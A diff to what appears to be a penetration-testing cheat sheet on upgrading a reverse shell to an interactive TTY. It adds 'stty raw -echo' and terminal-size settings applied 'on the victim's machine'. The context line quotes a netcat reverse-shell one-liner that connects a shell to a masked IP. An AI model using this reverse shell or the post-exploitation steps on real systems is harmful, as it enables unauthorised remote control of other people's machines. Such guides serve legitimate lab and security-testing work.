@@ -93,11 +93,20 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.xxx.xxx 9
 
     ```bash
     fg
+    stty raw -echo; fg
     ```
 
-4. Press `Enter` twice to reactivate the session.
+4. On the victim's machine, configure the shell:
+
+    ```bash
+    stty rows $x columns $y  # Set remote shell to x number of rows & y columns
+    export TERM=xterm-256color  # Allows you to clear console and have color output
+    ```
+
+5. Press `Enter` twice to reactivate the session.
 
 Now you should have a shell with autocomplete, history, and better usability features.
+
 
 To have autocomplete on a Windows machine, you can also use:
 
